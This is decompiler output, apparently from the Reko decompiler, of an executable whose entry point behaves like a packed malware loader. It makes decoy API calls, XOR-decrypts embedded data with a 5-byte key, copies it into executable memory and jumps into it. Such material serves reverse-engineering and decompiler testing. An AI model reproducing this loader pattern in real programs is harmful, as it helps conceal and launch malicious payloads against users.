// subject.c
// Generated by decompiling subject.exe
// using Reko decompiler version VERSION

#include "subject.h"

// 13101000: void fn13101000(Stack (ptr32 byte) dwArg04, Stack ptr32 dwArg08, Stack word32 dwArg0C, Stack (ptr32 word32) dwArg10, Stack word32 dwArg14, Stack Eq_7 dwArg18)
void fn13101000(byte * dwArg04, ptr32 dwArg08, word32 dwArg0C, word32 * dwArg10, word32 dwArg14, Eq_7 dwArg18)
{
	*dwArg10 = dwArg0C;
	word16 wLoc08_25 = (word16) (uint32) ((uint64) (uint32) dwArg14 % 0x05);
	byte * dwArg08_30 = dwArg08 + dwArg14;
	while (true)
	{
		dwArg0C = dwArg0C - 0x01;
		if (dwArg0C == 0x00)
			break;
		Mem77[dwArg04 + 0x00:byte] = (byte) ((int32) *dwArg08_30 ^ (word32) Mem13[(int32) wLoc08_25 + dwArg18:byte]);
		word16 ax_79 = wLoc08_25 + 0x01;
		wLoc08_25 = ax_79;
		if ((int32) ax_79 == 0x05)
			wLoc08_25 = 0x00;
		dwArg04 = dwArg04 + 0x01;
		dwArg08_30 = dwArg08_30 + 0x01;
	}
}

// 1310109B: Register Eq_48 Win32CrtStartup()
DWORD Win32CrtStartup()
{
	AddAccessDeniedAce((ACL *) 0x02800000, 0x04A00000, 0x2600, null);
	word32 esp_39;
	word32 ebp_40;
	byte SCZO_41;
	word32 eax_42;
	word32 ebx_43;
	word32 ecx_44;
	word32 esi_45;
	word32 edx_46;
	byte SZO_47;
	bool C_48;
	bool Z_49;
	word32 edi_50;
	byte dl_51;
	ADVAPI32.dll!BuildExplicitAccessWithNameA();
	word32 esp_53;
	word32 ebp_54;
	byte SCZO_55;
	word32 eax_56;
	word32 ebx_57;
	word32 ecx_58;
	word32 esi_59;
	word32 edx_60;
	byte SZO_61;
	bool C_62;
	bool Z_63;
	word32 edi_64;
	byte dl_65;
	KERNEL32.dll!BaseInitAppcompatCacheSupport();
	HRESULT eax_25 = SafeArrayGetUBound(null, 0x028C0000, (LONG *) 0x0900);
	word32 eax_75 = *((word32) eax_25 - 0x6CF5E057);
	fn13101000(fp - 0x023C, fp - 0x023C, 0x04, fp - 0x10, 0x00, fp - 0x0234);
	Eq_94 eax_96 = SetErrorMode(0x0BC0);
	word32 esp_103;
	word32 ebp_104;
	byte SCZO_105;
	word32 eax_106;
	word32 ebx_107;
	word32 ecx_108;
	word32 esi_109;
	word32 edx_110;
	byte SZO_111;
	bool C_112;
	bool Z_113;
	word32 edi_114;
	byte dl_115;
	KERNEL32.dll!BaseInitAppcompatCacheSupport();
	Eq_139 ecx_117 = *((word32) eax_25 - 1828053075);
	fn13101000(fp - 600, fp - 0x025C, 0x04, fp - 0x10, 0x04, fp - 0x0234);
	Eq_155 ecx_140 = *((word32) eax_25 - 1828053071);
	word32 esp_142;
	word32 ebp_143;
	byte SCZO_144;
	word32 eax_145;
	word32 ebx_146;
	word32 ecx_147;
	word32 esi_148;
	word32 edx_149;
	byte SZO_150;
	bool C_151;
	bool Z_152;
	word32 edi_153;
	byte dl_154;
	KERNEL32.dll!BaseDumpAppcompatCache();
	fn13101000(fp - 0x14, fp - 0x1C, 0x04, fp - 0x10, 0x08, fp - 0x0234);
	Eq_186 eax_179 = GetModuleHandleA(null);
	Eq_59 eax_199 = AdjustTokenGroups(null, 0x00, (struct _TOKEN_GROUPS *) 0x4400, 0x80000000, (struct _TOKEN_GROUPS *) 0x78000000, null);
	word32 esp_211;
	word32 ebp_212;
	byte SCZO_213;
	word32 eax_214;
	word32 ebx_215;
	word32 ecx_216;
	word32 esi_217;
	word32 edx_218;
	byte SZO_219;
	bool C_220;
	bool Z_221;
	word32 edi_222;
	byte dl_223;
	ADVAPI32.dll!ControlTraceA();
	word32 esp_237;
	word32 ebp_238;
	byte SCZO_239;
	word32 eax_240;
	word32 ebx_241;
	word32 ecx_242;
	word32 esi_243;
	word32 edx_244;
	byte SZO_245;
	bool C_246;
	bool Z_247;
	word32 edi_248;
	byte dl_249;
	ADVAPI32.dll!BuildTrusteeWithObjectsAndNameA();
	Eq_238 ebx_251 = *((word32) eax_25 - 1828053067);
	fn13101000(fp - 0x1C, fp - 0x28, 0x04, fp - 0x10, 0x0C, fp - 0x0234);
	Eq_254 dwLoc2388_284 = *((word32) eax_25 - 1828053063);
	fn13101000(fp + ~0x2387, fp + ~0x2397, 0x04, fp - 0x10, 0x10, fp - 0x0234);
	Eq_254 ebx_312 = ecx_140 * 0x08 + 0x0C;
	ui32 dwLoc2390_307 = 0x14;
	word32 dwLoc24_310 = eax_25 + 2466914237;
	word32 eax_325 = VirtualAlloc(null, ebx_312 + ecx_117 + eax_75, 0x3000, 0x40);
	word32 dwLoc0C_331 = ebx_251 + eax_179 + ebx_312;
	Eq_254 dwLoc0264_335 = ebx_312;
	Eq_155 dwLoc08_336 = 0x00;
	word32 dwLoc18_337 = 0x00;
	while (0x01 != 0x00)
	{
		if (dwLoc0264_335 == dwLoc2388_284)
		{
			Eq_155 eax_464 = (word32) dwLoc08_336.dw0000 + 0x01;
			dwLoc08_336 = eax_464;
			if (eax_464 == ecx_140)
				break;
			Eq_408 ecx_470 = *((char *) &dwLoc24_310->t930A1FB9.t0000.t0000 + 1828053063);
			*(fp - 744) = fp - 0x0234;
			*(fp - 0x02EC) = dwLoc2390_307;
			*(fp - 0x02F0) = fp - 0x10;
			*(fp - 0x02F4) = 0x04;
			*(fp - 0x02F8) = fp - 0x1C - dwLoc2390_307;
			*(fp - 0x02FC) = fp - 0x1C;
			fn13101000(dwArg00, dwArg04, dwArg08, dwArg0C, dwArg10, dwArg14);
			word32 ebx_499 = dwLoc24_310 + 0x04;
			dwLoc2388_284 = (Eq_254) ebx_499->t0000.dw0000;
			*(fp - 744) = fp - 0x0234;
			ui32 ebx_496 = dwLoc2390_307 + 0x04;
			*(fp - 0x02EC) = ebx_496;
			*(fp - 0x02F0) = fp - 0x10;
			*(fp - 0x02F4) = 0x04;
			*(fp - 0x02F8) = fp + ~0x2387 - ebx_496;
			*(fp - 0x02FC) = fp + ~0x2387;
			fn13101000(dwArg00, dwArg04, dwArg08, dwArg0C, dwArg10, dwArg14);
			dwLoc2390_307 = ebx_496 + 0x04;
			dwLoc24_310 = ebx_499 + 0x04;
			dwLoc0264_335 = (Eq_254) 0x00;
			dwLoc0C_331 = ecx_470 + eax_179;
		}
		*((char *) eax_325 + dwLoc18_337) = (Eq_280) *dwLoc0C_331.t0000;
		dwLoc0C_331 = dwLoc0C_331 + 0x01;
		dwLoc18_337 = dwLoc18_337 + 0x01;
		dwLoc0264_335 = dwLoc0264_335 + 0x01;
	}
	*(fp - 744) = fp - 0x0234;
	(fp - 0x02EC)->t0000.t0000 = ebx_312;
	*(fp - 0x02F0) = fp - 0x0238;
	(fp - 0x02F4)->t0000 = (LPVOID) ecx_117;
	*(fp - 0x02F8) = (LPVOID *) (eax_325 - ebx_312);
	*(fp - 0x02FC) = (LPVOID *) eax_325;
	fn13101000(dwArg00, dwArg04, dwArg08, dwArg0C, dwArg10, dwArg14);
	*(fp - 744) = fp;
	*(fp - 0x02EC) = fp - 0x0234;
	(fp - 0x02F0)->t0000 = (LPVOID) ecx_117;
	*(fp - 0x02F4) = eax_75;
	*(fp - 0x02F8) = (LPVOID *) eax_325;
	word32 eax_408 = eax_325 + ecx_117;
	*(fp - 0x02FC) = (LPVOID *) eax_408;
	word32 esp_412;
	word32 ebp_413;
	byte SCZO_414;
	Eq_48 eax_415;
	word32 ebx_416;
	word32 ecx_417;
	word32 esi_418;
	word32 edx_419;
	byte SZO_420;
	bool C_421;
	bool Z_422;
	word32 edi_423;
	byte dl_424;
	(eax_325 + 0x0F50)();
	return eax_415;
}

